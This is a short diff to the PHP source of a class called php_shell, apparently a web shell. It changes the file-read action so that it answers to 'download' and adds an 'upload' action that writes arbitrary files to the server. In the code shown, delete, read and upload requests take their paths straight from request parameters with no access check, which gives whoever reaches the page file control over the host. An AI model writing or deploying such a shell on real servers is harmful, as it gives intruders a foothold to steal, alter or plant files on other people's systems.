@@ -213,7 +213,7 @@ class php_shell {
 			$this->deleteFile($file);
 		}
 		
-		if($action == "upload")
+		if($action == "download")
 		{
 			$name = (isset($_REQUEST["name"])) ? $_REQUEST["name"] : "unknow";
 			$content = file_get_contents($file);
@@ -226,6 +226,11 @@ class php_shell {
 			echo $content;
 			die;
 		}
+
+if($action == "upload")
+{
+$this->uploadFile("file", $_FILES["file"]["name"]);
+}
 		
 		
 		if($action == "save" && isset($_REQUEST["data"]))
@@ -377,7 +382,7 @@ $shell->dispatcher();
 					<td><?php echo $file->getOwner(); ?>
 					<td><?php echo $file->getSize(); ?></td>
 					<td><?php echo $file->getChmod(); ?></td>
-					<td><a class="del" href="/?dir=<?php echo $shell->currentDir; ?>&a=del&file=<?php echo $shell->currentDir . "/" .  $filename; ?>">del</a> <a class="upload" target="_blank" href="/?dir=<?php echo $shell->currentDir; ?>&a=upload&file=<?php echo $shell->currentDir . "/" .  $filename; ?>&name=<?php echo $filename; ?>">upload</a></td>
+					<td><a class="del" href="/?dir=<?php echo $shell->currentDir; ?>&a=del&file=<?php echo $shell->currentDir . "/" .  $filename; ?>">del</a> <a class="upload" target="_blank" href="/?dir=<?php echo $shell->currentDir; ?>&a=download&file=<?php echo $shell->currentDir . "/" .  $filename; ?>&name=<?php echo $filename; ?>">upload</a></td>
 				</tr>
 				<?php endforeach; ?>
 				<?php else: ?>
